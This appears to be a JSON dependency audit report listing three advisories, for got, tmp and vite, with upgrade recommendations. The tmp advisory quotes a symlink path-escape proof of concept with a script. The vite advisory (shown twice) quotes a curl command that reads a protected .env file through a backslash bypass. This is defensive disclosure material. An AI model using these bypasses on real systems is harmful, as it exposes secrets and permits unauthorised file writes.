{
  "actions": [
    {
      "action": "review",
      "module": "got",
      "resolves": [
        {
          "id": 1088948,
          "path": "apps__ratewise>workbox-cli>update-notifier>latest-version>package-json>got",
          "dev": false,
          "optional": false,
          "bundled": false
        }
      ]
    },
    {
      "action": "review",
      "module": "tmp",
      "resolves": [
        {
          "id": 1106849,
          "path": "apps__ratewise>@lhci/cli>inquirer>external-editor>tmp",
          "dev": false,
          "optional": false,
          "bundled": false
        },
        {
          "id": 1106849,
          "path": "apps__ratewise>@lhci/cli>tmp",
          "dev": false,
          "optional": false,
          "bundled": false
        }
      ]
    },
    {
      "action": "review",
      "module": "vite",
      "resolves": [
        {
          "id": 1109135,
          "path": "apps__ratewise>vite",
          "dev": false,
          "optional": false,
          "bundled": false
        },
        {
          "id": 1109137,
          "path": ".>vite",
          "dev": false,
          "optional": false,
          "bundled": false
        }
      ]
    }
  ],
  "advisories": {
    "1088948": {
      "findings": [
        {
          "version": "9.6.0",
          "paths": [
            "apps/ratewise > workbox-cli@7.3.0 > update-notifier@4.1.3 > latest-version@5.1.0 > package-json@6.5.0 > got@9.6.0"
          ]
        }
      ],
      "found_by": null,
      "deleted": null,
      "references": "- https://nvd.nist.gov/vuln/detail/CVE-2022-33987\n- https://github.com/sindresorhus/got/pull/2047\n- https://github.com/sindresorhus/got/compare/v12.0.3...v12.1.0\n- https://github.com/sindresorhus/got/commit/861ccd9ac2237df762a9e2beed7edd88c60782dc\n- https://github.com/sindresorhus/got/releases/tag/v11.8.5\n- https://github.com/sindresorhus/got/releases/tag/v12.1.0\n- https://github.com/advisories/GHSA-pfrx-2q88-qq97",
      "created": "2022-06-19T00:00:21.000Z",
      "id": 1088948,
      "npm_advisory_id": null,
      "overview": "The got package before 11.8.5 and 12.1.0 for Node.js allows a redirect to a UNIX socket.",
      "reported_by": null,
      "title": "Got allows a redirect to a UNIX socket",
      "metadata": null,
      "cves": ["CVE-2022-33987"],
      "access": "public",
      "severity": "moderate",
      "module_name": "got",
      "vulnerable_versions": "<11.8.5",
      "github_advisory_id": "GHSA-pfrx-2q88-qq97",
      "recommendation": "Upgrade to version 11.8.5 or later",
      "patched_versions": ">=11.8.5",
      "updated": "2023-01-27T05:05:01.000Z",
      "cvss": {
        "score": 5.3,
        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N"
      },
      "cwe": [],
      "url": "https://github.com/advisories/GHSA-pfrx-2q88-qq97"
    },
    "1106849": {
      "findings": [
        {
          "version": "0.0.33",
          "paths": [
            "apps/ratewise > @lhci/cli@0.15.1 > inquirer@6.5.2 > external-editor@3.1.0 > tmp@0.0.33",
            "apps/ratewise > workbox-cli@7.3.0 > inquirer@7.3.3 > external-editor@3.1.0 > tmp@0.0.33"
          ]
        },
        {
          "version": "0.1.0",
          "paths": ["apps/ratewise > @lhci/cli@0.15.1 > tmp@0.1.0"]
        }
      ],
      "found_by": null,
      "deleted": null,
      "references": "- https://github.com/raszi/node-tmp/security/advisories/GHSA-52f5-9888-hmc6\n- https://github.com/raszi/node-tmp/commit/188b25e529496e37adaf1a1d9dccb40019a08b1b\n- https://nvd.nist.gov/vuln/detail/CVE-2025-54798\n- https://github.com/raszi/node-tmp/issues/207\n- https://github.com/advisories/GHSA-52f5-9888-hmc6",
      "created": "2025-08-06T17:06:04.000Z",
      "id": 1106849,
      "npm_advisory_id": null,
      "overview": "### Summary\n\n`tmp@0.2.3` is vulnerable to an Arbitrary temporary file / directory write via symbolic link `dir` parameter.\n\n\n### Details\n\nAccording to the documentation there are some conditions that must be held:\n\n```\n// https://github.com/raszi/node-tmp/blob/v0.2.3/README.md?plain=1#L41-L50\n\nOther breaking changes, i.e.\n\n- template must be relative to tmpdir\n- name must be relative to tmpdir\n- dir option must be relative to tmpdir //<-- this assumption can be bypassed using symlinks\n\nare still in place.\n\nIn order to override the system's tmpdir, you will have to use the newly\nintroduced tmpdir option.\n\n\n// https://github.com/raszi/node-tmp/blob/v0.2.3/README.md?plain=1#L375\n* `dir`: the optional temporary directory that must be relative to the system's default temporary directory.\n     absolute paths are fine as long as they point to a location under the system's default temporary directory.\n     Any directories along the so specified path must exist, otherwise a ENOENT error will be thrown upon access, \n     as tmp will not check the availability of the path, nor will it establish the requested path for you.\n```\n\nRelated issue: https://github.com/raszi/node-tmp/issues/207.\n\n\nThe issue occurs because `_resolvePath` does not properly handle symbolic link when resolving paths:\n```js\n// https://github.com/raszi/node-tmp/blob/v0.2.3/lib/tmp.js#L573-L579\nfunction _resolvePath(name, tmpDir) {\n  if (name.startsWith(tmpDir)) {\n    return path.resolve(name);\n  } else {\n    return path.resolve(path.join(tmpDir, name));\n  }\n}\n```\n\nIf the `dir` parameter points to a symlink that resolves to a folder outside the `tmpDir`, it's possible to bypass the `_assertIsRelative` check used in `_assertAndSanitizeOptions`:\n```js\n// https://github.com/raszi/node-tmp/blob/v0.2.3/lib/tmp.js#L590-L609\nfunction _assertIsRelative(name, option, tmpDir) {\n  if (option === 'name') {\n    // assert that name is not absolute and does not contain a path\n    if (path.isAbsolute(name))\n      throw new Error(`${option} option must not contain an absolute path, found \"${name}\".`);\n    // must not fail on valid .<name> or ..<name> or similar such constructs\n    let basename = path.basename(name);\n    if (basename === '..' || basename === '.' || basename !== name)\n      throw new Error(`${option} option must not contain a path, found \"${name}\".`);\n  }\n  else { // if (option === 'dir' || option === 'template') {\n    // assert that dir or template are relative to tmpDir\n    if (path.isAbsolute(name) && !name.startsWith(tmpDir)) {\n      throw new Error(`${option} option must be relative to \"${tmpDir}\", found \"${name}\".`);\n    }\n    let resolvedPath = _resolvePath(name, tmpDir); //<--- \n    if (!resolvedPath.startsWith(tmpDir))\n      throw new Error(`${option} option must be relative to \"${tmpDir}\", found \"${resolvedPath}\".`);\n  }\n}\n```\n\n\n### PoC\n\nThe following PoC demonstrates how writing a tmp file on a folder outside the `tmpDir` is possible.\nTested on a Linux machine.\n\n- Setup: create a symbolic link inside the `tmpDir` that points to a directory outside of it\n```bash\nmkdir $HOME/mydir1\n\nln -s $HOME/mydir1 ${TMPDIR:-/tmp}/evil-dir\n```\n\n- check the folder is empty:\n```bash\nls -lha $HOME/mydir1 | grep \"tmp-\"\n```\n\n- run the poc\n```bash\nnode main.js\nFile:  /tmp/evil-dir/tmp-26821-Vw87SLRaBIlf\ntest 1: ENOENT: no such file or directory, open '/tmp/mydir1/tmp-[random-id]'\ntest 2: dir option must be relative to \"/tmp\", found \"/foo\".\ntest 3: dir option must be relative to \"/tmp\", found \"/home/user/mydir1\".\n```\n\n- the temporary file is created under `$HOME/mydir1` (outside the `tmpDir`):\n```bash\nls -lha $HOME/mydir1 | grep \"tmp-\"\n-rw------- 1 user user    0 Apr  X XX:XX tmp-[random-id]\n```\n\n\n- `main.js`\n```js\n// npm i tmp@0.2.3\n\nconst tmp = require('tmp');\n\nconst tmpobj = tmp.fileSync({ 'dir': 'evil-dir'});\nconsole.log('File: ', tmpobj.name);\n\ntry {\n    tmp.fileSync({ 'dir': 'mydir1'});\n} catch (err) {\n    console.log('test 1:', err.message)\n}\n\ntry {\n    tmp.fileSync({ 'dir': '/foo'});\n} catch (err) {\n    console.log('test 2:', err.message)\n}\n\ntry {\n    const fs = require('node:fs');\n    const resolved = fs.realpathSync('/tmp/evil-dir');\n    tmp.fileSync({ 'dir': resolved});\n} catch (err) {\n    console.log('test 3:', err.message)\n}\n```\n\n\nA Potential fix could be to call `fs.realpathSync` (or similar) that resolves also symbolic links.\n```js\nfunction _resolvePath(name, tmpDir) {\n  let resolvedPath;\n  if (name.startsWith(tmpDir)) {\n    resolvedPath = path.resolve(name);\n  } else {\n    resolvedPath = path.resolve(path.join(tmpDir, name));\n  }\n  return fs.realpathSync(resolvedPath);\n}\n```\n\n\n### Impact\n\nArbitrary temporary file / directory write via symlink",
      "reported_by": null,
      "title": "tmp allows arbitrary temporary file / directory write via symbolic link `dir` parameter",
      "metadata": null,
      "cves": ["CVE-2025-54798"],
      "access": "public",
      "severity": "low",
      "module_name": "tmp",
      "vulnerable_versions": "<=0.2.3",
      "github_advisory_id": "GHSA-52f5-9888-hmc6",
      "recommendation": "Upgrade to version 0.2.4 or later",
      "patched_versions": ">=0.2.4",
      "updated": "2025-08-07T15:11:23.000Z",
      "cvss": {
        "score": 2.5,
        "vectorString": "CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:N/I:L/A:N"
      },
      "cwe": ["CWE-59"],
      "url": "https://github.com/advisories/GHSA-52f5-9888-hmc6"
    },
    "1109135": {
      "findings": [
        {
          "version": "6.4.0",
          "paths": [
            "apps/ratewise > @vitejs/plugin-react-swc@4.1.0 > vite@6.4.0",
            "apps/ratewise > vite@6.4.0",
            "apps/ratewise > vite-plugin-pwa@0.21.2 > vite@6.4.0"
          ]
        }
      ],
      "found_by": null,
      "deleted": null,
      "references": "- https://github.com/vitejs/vite/security/advisories/GHSA-93m4-6634-74q7\n- https://github.com/vitejs/vite/commit/f479cc57c425ed41ceb434fecebd63931b1ed4ed\n- https://nvd.nist.gov/vuln/detail/CVE-2025-62522\n- https://github.com/advisories/GHSA-93m4-6634-74q7",
      "created": "2025-10-20T19:54:28.000Z",
      "id": 1109135,
      "npm_advisory_id": null,
      "overview": "### Summary\nFiles denied by [`server.fs.deny`](https://vitejs.dev/config/server-options.html#server-fs-deny) were sent if the URL ended with `\\` when the dev server is running on Windows.\n\n### Impact\nOnly apps that match the following conditions are affected:\n\n- explicitly exposes the Vite dev server to the network (using --host or [`server.host` config option](https://vitejs.dev/config/server-options.html#server-host))\n- running the dev server on Windows\n\n### Details\n`server.fs.deny` can contain patterns matching against files (by default it includes `.env`, `.env.*`, `*.{crt,pem}` as such patterns). These patterns were able to bypass by using a back slash(`\\`). The root cause is that `fs.readFile('/foo.png/')` loads `/foo.png`.\n\n### PoC\n```shell\nnpm create vite@latest\ncd vite-project/\ncat \"secret\" > .env\nnpm install\nnpm run dev\ncurl --request-target /.env\\ http://localhost:5173\n```\n<img width=\"1593\" height=\"616\" alt=\"image\" src=\"https://github.com/user-attachments/assets/36212f4e-1d3c-4686-b16f-16b35ca9e175\" />",
      "reported_by": null,
      "title": "vite allows server.fs.deny bypass via backslash on Windows",
      "metadata": null,
      "cves": ["CVE-2025-62522"],
      "access": "public",
      "severity": "moderate",
      "module_name": "vite",
      "vulnerable_versions": ">=6.0.0 <=6.4.0",
      "github_advisory_id": "GHSA-93m4-6634-74q7",
      "recommendation": "Upgrade to version 6.4.1 or later",
      "patched_versions": ">=6.4.1",
      "updated": "2025-10-21T14:51:26.000Z",
      "cvss": {
        "score": 0,
        "vectorString": null
      },
      "cwe": ["CWE-22"],
      "url": "https://github.com/advisories/GHSA-93m4-6634-74q7"
    },
    "1109137": {
      "findings": [
        {
          "version": "7.1.9",
          "paths": [
            ". > @vitejs/plugin-react-swc@4.1.0 > vite@7.1.9",
            ". > @vitest/coverage-v8@3.2.4 > vitest@3.2.4 > @vitest/mocker@3.2.4 > vite@7.1.9",
            ". > @vitest/coverage-v8@3.2.4 > vitest@3.2.4 > vite@7.1.9",
            ". > @vitest/coverage-v8@3.2.4 > vitest@3.2.4 > vite-node@3.2.4 > vite@7.1.9",
            ". > vite@7.1.9",
            "apps/ratewise > @vitest/coverage-v8@3.2.4 > vitest@3.2.4 > @vitest/mocker@3.2.4 > vite@7.1.9",
            "apps/ratewise > @vitest/coverage-v8@3.2.4 > vitest@3.2.4 > vite@7.1.9",
            "apps/ratewise > @vitest/coverage-v8@3.2.4 > vitest@3.2.4 > vite-node@3.2.4 > vite@7.1.9",
            "apps/ratewise > vitest@3.2.4 > @vitest/mocker@3.2.4 > vite@7.1.9",
            "apps/ratewise > vitest@3.2.4 > vite@7.1.9",
            "apps/ratewise > vitest@3.2.4 > vite-node@3.2.4 > vite@7.1.9"
          ]
        }
      ],
      "found_by": null,
      "deleted": null,
      "references": "- https://github.com/vitejs/vite/security/advisories/GHSA-93m4-6634-74q7\n- https://github.com/vitejs/vite/commit/f479cc57c425ed41ceb434fecebd63931b1ed4ed\n- https://nvd.nist.gov/vuln/detail/CVE-2025-62522\n- https://github.com/advisories/GHSA-93m4-6634-74q7",
      "created": "2025-10-20T19:54:28.000Z",
      "id": 1109137,
      "npm_advisory_id": null,
      "overview": "### Summary\nFiles denied by [`server.fs.deny`](https://vitejs.dev/config/server-options.html#server-fs-deny) were sent if the URL ended with `\\` when the dev server is running on Windows.\n\n### Impact\nOnly apps that match the following conditions are affected:\n\n- explicitly exposes the Vite dev server to the network (using --host or [`server.host` config option](https://vitejs.dev/config/server-options.html#server-host))\n- running the dev server on Windows\n\n### Details\n`server.fs.deny` can contain patterns matching against files (by default it includes `.env`, `.env.*`, `*.{crt,pem}` as such patterns). These patterns were able to bypass by using a back slash(`\\`). The root cause is that `fs.readFile('/foo.png/')` loads `/foo.png`.\n\n### PoC\n```shell\nnpm create vite@latest\ncd vite-project/\ncat \"secret\" > .env\nnpm install\nnpm run dev\ncurl --request-target /.env\\ http://localhost:5173\n```\n<img width=\"1593\" height=\"616\" alt=\"image\" src=\"https://github.com/user-attachments/assets/36212f4e-1d3c-4686-b16f-16b35ca9e175\" />",
      "reported_by": null,
      "title": "vite allows server.fs.deny bypass via backslash on Windows",
      "metadata": null,
      "cves": ["CVE-2025-62522"],
      "access": "public",
      "severity": "moderate",
      "module_name": "vite",
      "vulnerable_versions": ">=7.1.0 <=7.1.10",
      "github_advisory_id": "GHSA-93m4-6634-74q7",
      "recommendation": "Upgrade to version 7.1.11 or later",
      "patched_versions": ">=7.1.11",
      "updated": "2025-10-21T14:51:26.000Z",
      "cvss": {
        "score": 0,
        "vectorString": null
      },
      "cwe": ["CWE-22"],
      "url": "https://github.com/advisories/GHSA-93m4-6634-74q7"
    }
  },
  "muted": [],
  "metadata": {
    "vulnerabilities": {
      "info": 0,
      "low": 2,
      "moderate": 3,
      "high": 0,
      "critical": 0
    },
    "dependencies": 1321,
    "devDependencies": 0,
    "optionalDependencies": 0,
    "totalDependencies": 1321
  }
}
